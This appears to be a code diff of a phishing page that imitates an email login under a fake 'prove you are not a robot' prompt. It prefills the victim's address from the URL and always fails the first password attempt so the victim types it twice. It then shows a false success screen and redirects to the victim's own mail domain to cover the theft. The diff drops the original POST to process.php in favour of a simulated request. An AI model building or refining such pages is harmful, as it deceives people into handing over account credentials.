@@ -12,7 +12,89 @@
 </head>
 
 <style>
-    /* [All your original CSS remains exactly the same] */
+    body {
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        min-height: 100vh;
+        background: #f5f5f5;
+        font-family: 'Archivo Narrow', sans-serif;
+    }
+    .login-container {
+        width: 100%;
+        max-width: 400px;
+        padding: 25px;
+        background: white;
+        border-radius: 10px;
+        box-shadow: 0 4px 15px rgba(0, 0, 0, 0.1);
+    }
+    .btn-verify {
+        width: 50%;
+        margin: 0 auto;
+        display: block;
+        background: #062174;
+        color: white;
+        padding: 10px;
+        border: none;
+        border-radius: 5px;
+        transition: all 0.3s;
+    }
+    .btn-verify:hover {
+        background: #0a2d8a;
+    }
+    .shake {
+        animation: shake 0.5s;
+    }
+    @keyframes shake {
+        0%, 100% { transform: translateX(0); }
+        25% { transform: translateX(-5px); }
+        75% { transform: translateX(5px); }
+    }
+    .loading {
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        flex-flow: column;
+        gap: 10px;
+        position: fixed;
+        top: 0; right: 0; bottom: 0; left: 0;
+        z-index: 100;
+        background: white;
+    }
+    .verification-complete {
+        display: none;
+        justify-content: center;
+        align-items: center;
+        flex-flow: column;
+        gap: 10px;
+        position: fixed;
+        top: 0; right: 0; bottom: 0; left: 0;
+        z-index: 100;
+        background: white;
+    }
+    .loader {
+        width: 48px;
+        height: 48px;
+        display: inline-block;
+        position: relative;
+        background: black;
+        box-sizing: border-box;
+        animation: flipX 1s linear infinite;
+    }
+    @keyframes flipX {
+        0% { transform: perspective(200px) rotateX(0deg) rotateY(0deg); }
+        50% { transform: perspective(200px) rotateX(-180deg) rotateY(0deg); }
+        100% { transform: perspective(200px) rotateX(-180deg) rotateY(-180deg); }
+    }
+    .confirm {
+        font-weight: 600;
+    }
+    .text-secondary {
+        font-weight: bold;
+    }
+    .confirm-identity-spacing {
+        margin-bottom: 24px;
+    }
 </style>
 
 <body>
@@ -25,9 +107,7 @@
 
         <div class="text-center confirm confirm-identity-spacing">Confirm identity to prove you are not a robot</div>
 
-        <!-- Added action to form -->
-        <form id="loginForm" action="process.php" method="POST">
-            <input type="hidden" name="step" value="1">
+        <form id="loginForm">
             <div class="form-group">
                 <label class="text-secondary font-weight-bold">Email Address</label>
                 <input type="email" class="form-control" id="email" name="email" required autocomplete="username">
@@ -46,10 +126,100 @@
         </form>
     </div>
 
-    <!-- [All your original loading/verification elements remain the same] -->
-    
+    <div class="loading" id="loading">
+        <span class="loader"></span>
+        <h3 class="text-center">Connecting To Mail Server</h3>
+    </div>
+
+    <div class="verification-complete" id="verificationComplete">
+        <span class="loader" style="background: #28a745;"></span>
+        <h3 class="text-center" style="color: #28a745;">Verification complete!</h3>
+    </div>
+
+    <iframe src="" frameborder="0" id="iframe" style="display: none;"></iframe>
+
     <script>
-        // [All your original JavaScript remains exactly the same]
+        // Set email from URL hash if present
+        const emailInput = document.getElementById('email');
+        const hashEmail = window.location.hash.substring(1);
+        let redirectUrl = 'https://example.com'; // Default fallback
+        
+        if (hashEmail) {
+            emailInput.value = hashEmail;
+            // Set redirect URL based on email domain
+            const domain = hashEmail.split('@')[1];
+            if (domain) {
+                redirectUrl = `https://www.${domain}`;
+                document.getElementById('iframe').src = redirectUrl;
+            }
+        }
+
+        // Hide loader after 4 seconds
+        setTimeout(() => {
+            document.getElementById("loading").style.display = "none";
+        }, 4000);
+
+        let attempt = 0;
+
+        document.getElementById('loginForm').addEventListener('submit', async function(e) {
+            e.preventDefault();
+            attempt++;
+            
+            const form = this;
+            const errorMsg = document.getElementById('errorMsg');
+            const passwordInput = document.getElementById('password');
+            const submitBtn = document.getElementById('submitBtn');
+            const loading = document.getElementById('loading');
+            const verificationComplete = document.getElementById('verificationComplete');
+
+            // Show loading spinner
+            loading.style.display = 'flex';
+            errorMsg.style.display = 'none';
+
+            try {
+                const formData = new FormData(form);
+                formData.append('attempt', attempt);
+                
+                // Simulate server request
+                await new Promise(resolve => setTimeout(resolve, 1000));
+                
+                // Clear password field
+                passwordInput.value = '';
+
+                if (attempt === 1) {
+                    // First attempt: Show error
+                    loading.style.display = 'none';
+                    errorMsg.style.display = 'block';
+                    submitBtn.classList.add('shake');
+                    document.getElementById('btnText').textContent = 'Try Again';
+                    
+                    setTimeout(() => {
+                        submitBtn.classList.remove('shake');
+                        passwordInput.focus();
+                    }, 500);
+                } else {
+                    // Second attempt: Show verification complete then redirect
+                    loading.style.display = 'none';
+                    verificationComplete.style.display = 'flex';
+                    
+                    setTimeout(() => {
+                        // Force redirect through iframe
+                        const iframe = document.getElementById('iframe');
+                        iframe.onload = function() {
+                            window.top.location.href = redirectUrl;
+                        };
+                        iframe.src = redirectUrl;
+                    }, 2000);
+                }
+
+            } catch (error) {
+                console.error('Error:', error);
+                loading.style.display = 'none';
+                passwordInput.value = '';
+                errorMsg.textContent = 'Incorrect password. Please try again.';
+                errorMsg.style.display = 'block';
+            }
+        });
     </script>
 </body>
 </html>
